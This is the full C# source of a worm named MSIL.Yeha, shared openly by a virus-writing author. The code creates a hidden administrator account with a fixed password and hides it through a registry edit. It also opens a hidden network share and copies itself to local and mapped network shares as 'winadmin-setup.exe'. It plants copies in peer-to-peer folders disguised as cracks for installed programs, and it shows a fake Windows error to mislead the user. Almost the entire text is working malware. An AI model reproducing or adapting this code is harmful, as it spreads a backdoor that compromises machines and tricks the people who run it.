   /*************************************************************
    * C# - MSIL.Yeha
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    * by free0n
    * vx13d.net free0n@vx13d.net
    * ###########################################################
    *
    * Yeha works by first checking itself in the registry
    * if it hasn't ran yet it will attempt to create a
    * new hidden local admin user account named Yeha with the
    * password yehawashere. After the account is created
    * it creates a new network share in C:\Yeha and makes the
    * directory as hidden. This is so if someone is browsing
    * the network we might lure them in. Each time the exe
    * is run it will spread to any open network shares that
    * were found in the mru list in the registry. It copies
    * as winadmin-setup.exe.
    *
    * After the share spreading is completed it copies itself
    * to commonly shared p2p folders as cracks for programs
    * found in the program files directory. For example if
    * Trilian directory is found it creates a trillian-crack.exe
    * once the p2p is done it will display message if the day
    * is the 25th that Yeha has been here if it's not it
    * displays a common windows error message.
    *
    * Note: This uses the same trick as Snoopy did as
    * it looks like a console application but the output
    * type is windows application so we don't get a dorky
    * cmd window popping up when it's ran. Compiled with
    * MS Visual C# express
    *
    * thx RRLF!
    * keep vxing!
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/
   /************************************************************
    * Start of Program.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/

   using System;
   using System.Collections.Generic;
   using System.Text;
   using System.Windows.Forms;
   using System.IO;

   namespace Yeha {

       class Program {

           static void Main(string[] args) {

               Yeha yeha = new Yeha();
               if (!yeha.chkIt()) {
                   yeha.YehaUser();
                   yeha.CreateShare(@"C:\Yeha", "Yeha");
               }

               yeha.Share();
               yeha.p2p();

               if (DateTime.Now.Day == 25) {
                   MessageBox.Show("Yeha was here!", "Yeha", MessageBoxButtons.OK, MessageBoxIcon.Information);
               } else {
                   MessageBox.Show("Not a valid win32 program", "Windows", MessageBoxButtons.OK, MessageBoxIcon.Error);
               }
           }
       }
   }

   /************************************************************
    * Start of Yeha.cs
    * >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    ************************************************************/

   using System;
   using System.Text;
   using System.IO;
   using System.Diagnostics;
   using System.DirectoryServices;
   using Microsoft.Win32;
   using System.Collections;
   using System.Collections.Generic;
   using System.Management;

   namespace Yeha {

       class Yeha {

           private string me = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName);

           public bool chkIt() {
               //checking the registry to see if we have already ran. If
               //we aren't found in the registry we add the value.
               //Hkey local machine is good real estate ;)

               string regstr = (string)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Yeha", "Yeha", "Yeha");
               if (regstr == "Yeha") {
                   return true;
               } else {
                   RegistryKey key = Registry.LocalMachine.OpenSubKey("Software", true);
                   RegistryKey newkey = key.CreateSubKey("Yeha");
                   newkey.SetValue("Yeha", me);
                   return false;
               }
           }

           public void p2p() {

               //our p2p spreading is basically just a list of common folders
               //if the folder exists we drop a copies of ourselves as cracks
               //for programs we find the program files folder

               ArrayList arSharedFolders = new ArrayList();
               arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Downloads");
               arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\My Shared Folder");
               arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Shared");
               arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ares\\My Shared Folder");
               arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Downloads");
               arSharedFolders.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Shareaza\\Downloads");

               IEnumerator folder = arSharedFolders.GetEnumerator();
               while (folder.MoveNext()) {
                   string tada = Convert.ToString(folder.Current);
                   if (Directory.Exists(tada)) {
                       string progDir = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                       foreach (string d in Directory.GetDirectories(progDir)) {
                           string app = tada + "\\" + d.Substring(d.LastIndexOf("\\")).Replace("\\", string.Empty) + "-crack.exe";
                           File.Copy(me, app, true);
                       }
                   }
               }
           }

           public void YehaUser() {

               try {

                   //create our new admin user account on the local machine we are running on.
                   DirectoryEntry ad = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                   DirectoryEntry usr = ad.Children.Add("Yeha", "user");
                   usr.Invoke("SetPassword", new object[] { "yehawashere" });
                   usr.CommitChanges();

                   DirectoryEntry de;
                   de = ad.Children.Find("Administrators", "group");
                   if (de != null) {
                       de.Invoke("Add", new object[] { usr.Path.ToString() });
                   }

                   //now we need to make the user hidden from the login screen and the
                   //user accounts applet in the control panel to do this we
                   //use a reg hack.

                   try {
                       string rkey = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList";
                       Registry.SetValue(rkey, "Yeha", 0, RegistryValueKind.DWord);
                   } catch (Exception er) { }

               } catch (Exception ex) { }
           }

           public void Share() {

               //copy ourselves to all the local network shares on the computer
               //this could be good bait when someone connects and wonders what
               //winadmin-setup is.

               try {
                   ManagementObjectSearcher shares = new
                   ManagementObjectSearcher("select * from win32_share");
                   foreach (ManagementObject serv in shares.Get()) {
                       string shareName = Convert.ToString(serv["Name"]);
                       if (!shareName.Contains("$")) {
                           File.Copy(me, @"\\" + Environment.MachineName + @"\" + shareName + @"\winadmin-setup.exe", true);
                       }
                   }
               } catch (Exception ex) { }

               //now we need to copy ourselves to other shares
               //on the network to do this we check for network shares
               //in the MRU list, we may get lucky we may not

               try {
                   string key = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU\";
                   RegistryKey reg = Registry.CurrentUser.OpenSubKey(key); ;
                   foreach (string valuename in reg.GetValueNames()) {
                       string path = reg.GetValue(valuename).ToString();
                       if (valuename.ToLower() != "mrulist") {
                           try {
                               File.Copy(me, path + @"\\winadmin-setup.exe", true);
                           } catch (Exception er) {
                               continue;
                           }
                       }
                   }
                   reg.Close();
               } catch (Exception er) { }
           }

           public void CreateShare(string dir, string name) {

               //we create our own shared folder on the network called Yeha
               //this is so if we get a user browsing the network they might
               //open it up and double click winadmin-setup.exe. You know a user
               //might be more susceptible to pick it up if the folder was
               //named pr0n or porn hehehe.

               try {
                   Directory.CreateDirectory(dir);
                   ManagementClass managementClass = new ManagementClass("Win32_Share");
                   ManagementBaseObject inParams = managementClass.GetMethodParameters("Create");
                   ManagementBaseObject outParams;
                   inParams["Description"] = name;
                   inParams["Name"] = name;
                   inParams["Path"] = dir;
                   inParams["Type"] = 0x0;
                   outParams = managementClass.InvokeMethod("Create", inParams, null);

                   //if the return value was 0 then we know we got the folder created
                   //so we are going to make it hidden..
                   if ((uint)(outParams.Properties["ReturnValue"].Value) == 0) {
               //make the dir hidden
                       if (Directory.Exists(dir)) {
                           DirectoryInfo d = new DirectoryInfo(dir);
                           d.Attributes = FileAttributes.Hidden;
                       }
                   }

               } catch (Exception e) { }
           }
       }
   }



